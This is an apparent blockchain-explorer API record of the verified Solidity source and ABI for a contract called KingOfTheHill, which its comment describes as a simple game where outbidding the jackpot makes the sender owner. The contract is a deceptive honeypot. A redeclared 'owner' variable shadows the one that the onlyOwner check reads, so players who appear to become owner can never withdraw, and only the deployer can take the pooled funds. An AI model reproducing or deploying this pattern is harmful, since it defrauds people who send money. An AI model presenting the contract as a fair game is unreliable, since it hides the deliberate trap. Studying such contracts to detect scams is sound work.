{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.11;\r\n\r\n// Simple Game. Each time you send more than the current jackpot, you become\r\n// owner of the contract. As an owner, you can take the jackpot after a delay\r\n// of 5 days after the last payment.\r\n\r\ncontract Owned {\r\n    address owner;    function Owned() {\r\n        owner = msg.sender;\r\n    }\r\n    modifier onlyOwner{\r\n        if (msg.sender != owner)\r\n            revert();        _;\r\n    }\r\n}\r\n\r\ncontract KingOfTheHill is Owned {\r\n    address public owner;\r\n    uint public jackpot;\r\n    uint public withdrawDelay;\r\n\r\n    function() public payable {\r\n        // transfer contract ownership if player pay more than current jackpot\r\n        if (msg.value > jackpot) {\r\n            owner = msg.sender;\r\n            withdrawDelay = block.timestamp + 5 days;\r\n        }\r\n        jackpot+=msg.value;\r\n    }\r\n\r\n    function takeAll() public onlyOwner {\r\n        require(block.timestamp >= withdrawDelay);\r\n        msg.sender.transfer(this.balance);\r\n        jackpot=0;\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"withdrawDelay\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"jackpot\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"takeAll\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"payable\":true,\"type\":\"fallback\"}]","ContractName":"KingOfTheHill","CompilerVersion":"v0.4.11+commit.68ef5810","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://9b4c889ccf243d5ca86c6dd166e112d14dbf6e20dc14faf3e543051be0f2e5e9"}]}